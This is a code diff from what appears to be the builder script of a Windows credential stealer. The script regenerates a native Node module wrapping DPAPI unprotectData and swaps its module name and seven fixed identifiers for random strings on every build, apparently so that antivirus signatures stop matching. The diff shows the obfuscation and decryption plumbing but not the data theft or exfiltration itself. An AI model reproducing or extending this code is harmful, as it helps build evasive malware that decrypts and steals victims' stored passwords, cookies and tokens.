@@ -264,9 +264,79 @@ function get_pkg_cache() {
 }
 
 async function rename_dapi() {
-    let path = `./node_modules/dapifix/src/node-dpapi.cpp`;
+    let path = `./node_modules/dapifix`
+    let original_name = "node-dpapi"
+    let new_name = makeid_var(12);
 
-    let content = `#include <node.h>
+    fs.rmSync(`${path}\\build`, { recursive: true, force: true })
+
+    if (!fs.existsSync(`${path}\\src\\node-dpapi.cpp`) || !(fs.readFileSync(`${path}\\src\\node-dpapi.cpp`, "utf-8")).includes(original_name)) {
+
+        let index_js = `const dpapi = require("bindings")("node-dpapi");
+
+module.exports.unprotectData = dpapi.unprotectData;`;
+
+        let index_d_ts = `declare module "node-dpapi" {
+    function unprotectData(
+        encryptedData: Uint8Array,
+        optionalEntropy: Uint8Array,
+        scope: "CurrentUser" | "LocalMachine"
+    ): Uint8Array;
+}`;
+
+        let binding_gyp = `{
+"targets": [
+    {
+    "target_name": "node-dpapi",
+    "sources": [ "src/node-dpapi.cpp" ],
+    "include_dirs": [
+        "<!(node -e \\"require('nan')\\")",
+        "include"
+    ],
+    "libraries": [
+        "-lcrypt32.lib"
+    ]
+    }
+]
+}`;
+
+        fs.rmSync(`${path}\\src`, { recursive: true, force: true });
+        fs.mkdirSync(`${path}\\src`);
+        fs.writeFileSync(`${path}\\src\\node-dpapi.cpp`, "PLACEHOLDER");
+        fs.writeFileSync(`${path}\\index.js`, index_js);
+        fs.writeFileSync(`${path}\\index.d.ts`, index_d_ts);
+        fs.writeFileSync(`${path}\\binding.gyp`, binding_gyp);
+    }
+
+    ["src\\node-dpapi.cpp", "index.js", "index.d.ts", "binding.gyp"].forEach(file => {
+        let content = fs.readFileSync(`${path}\\${file}`, "utf-8")
+
+        let splits = content.split(" ");
+
+        for (var split in splits) {
+            let string = splits[split];
+            string = string.replace(original_name, new_name);
+
+            splits[split] = string;
+        }
+
+        content = splits.join(" ")
+
+        fs.writeFileSync(`${path}\\${file}`, content, "utf-8")
+    })
+
+    console.log(`Renaming dapi vars`)
+    await rename_dapi_vars();
+    console.log(`Renamed dapi vars`)
+
+    fs.renameSync(`${path}\\src\\node-dpapi.cpp`, `${path}\\src\\${new_name}.cpp`)
+}
+
+async function rename_dapi_vars() {
+    return new Promise(res => {
+        let path = `./node_modules/dapifix/src/node-dpapi.cpp`;
+
+        let content = `#include <node.h>
 #include <nan.h>
 #include <Windows.h>
 #include <dpapi.h>
@@ -319,25 +389,10 @@ NAN_MODULE_WORKER_ENABLED(binding, init)
 NODE_MODULE(binding, init)
 #endif`
 
-    let splits = content.split(" ");
+        let splits = content.split(" ");
 
-    let new_vars = {};
+        let new_vars = {};
 
-    [
-        "CwqjUWHQMEHRqGJFVnDcaGhRa",
-        "UQDJcHcaSaTefKfYStdCYrDvn",
-        "UnEwXzYWTBpnaePEkkNvZrWhM",
-        "yhKrTZMuRNvScccDUkegDyMQE",
-        "juGsCdDXyXpRnFnbPYMuxJUKm",
-        "kfghGYAWWyVrmZEpPfDCgUqCg",
-        "HZECTReECYfAEykgJJsZbnmQC",
-    ].forEach(variable => {
-        let new_var = makeid_var(32);
-        new_vars[variable] = new_var;
-    })
-
-    for (var split in splits) {
-        let string = splits[split];
         [
             "CwqjUWHQMEHRqGJFVnDcaGhRa",
             "UQDJcHcaSaTefKfYStdCYrDvn",
@@ -347,15 +402,31 @@ NODE_MODULE(binding, init)
             "kfghGYAWWyVrmZEpPfDCgUqCg",
             "HZECTReECYfAEykgJJsZbnmQC",
         ].forEach(variable => {
-            string = string.replace(variable, new_vars[variable])
+            let new_var = makeid_var(32);
+            new_vars[variable] = new_var;
         })
 
-        splits[split] = string;
-    }
+        for (var split in splits) {
+            let string = splits[split];
+            [
+                "CwqjUWHQMEHRqGJFVnDcaGhRa",
+                "UQDJcHcaSaTefKfYStdCYrDvn",
+                "UnEwXzYWTBpnaePEkkNvZrWhM",
+                "yhKrTZMuRNvScccDUkegDyMQE",
+                "juGsCdDXyXpRnFnbPYMuxJUKm",
+                "kfghGYAWWyVrmZEpPfDCgUqCg",
+                "HZECTReECYfAEykgJJsZbnmQC",
+            ].forEach(variable => {
+                string = string.replace(variable, new_vars[variable])
+            })
 
-    content = splits.join(" ")
+            splits[split] = string;
+        }
 
-    fs.writeFileSync(path, content)
+        content = splits.join(" ")
+
+        res(fs.writeFileSync(path, content))
+    })
 }
 
 (async () => {
